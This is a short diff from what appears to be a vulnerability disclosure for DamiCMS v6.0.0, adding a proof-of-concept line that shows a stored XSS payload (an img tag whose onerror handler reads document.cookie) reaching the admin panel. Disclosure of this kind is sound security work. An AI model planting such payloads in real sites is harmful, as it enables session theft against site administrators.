@@ -29,6 +29,7 @@ poc：
 ```
 
 damicms-master/admin.php?s=/Index/index
+Successfully inserted <img src="x" onerror=alert(document.cookie)>
 
 ![描述](https://github.com/wind-cyber/DamiCMS-v6.0.0-have-csrf-and-xss-Vulnerabilities-/blob/master/rpng/ZS4DTJV2YV%5DB6QRAEP0%25FH8.png)
 
